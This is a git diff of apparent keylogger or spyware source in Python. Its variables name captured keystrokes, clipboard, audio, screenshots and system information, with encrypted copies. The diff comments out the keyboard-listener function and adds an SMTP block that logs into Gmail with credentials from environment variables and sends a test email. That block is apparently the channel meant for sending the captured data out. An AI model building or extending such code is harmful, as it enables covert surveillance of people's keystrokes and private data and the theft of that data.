@@ -27,6 +27,8 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
+# Variables
+
 system_information = "system.txt"
 audio_information = "audio.wav"
 clipboard_information = "clipboard.txt"
@@ -37,6 +39,8 @@ system_information_enc = 'enc_system.txt'
 clipboard_information_enc = 'enc_clipboard.txt'
 keys_information_enc = 'enc_keys_logged.txt'
 
+# Keyboard Logging
+'''
 def on_press_func(key):
     try:
         if(key == Key.shift_r):
@@ -54,3 +58,16 @@ with Listener(
     listener.join()
 
 f.close()
+'''
+# Email
+
+sender_email = os.environ['SENDER_EMAIL']
+sender_emails_pwd = os.environ['SENDER_EMAIL_PWD']
+receiver_email = os.environ['RECEIVER_EMAIL']
+
+smtp_session = smtplib.SMTP('smtp.gmail.com', 587)
+smtp_session.starttls()
+smtp_session.login(sender_email, sender_emails_pwd)
+message = "Testing3 to see if I can send emails through Python"
+smtp_session.sendmail(sender_email, receiver_email, message)
+smtp_session.quit()
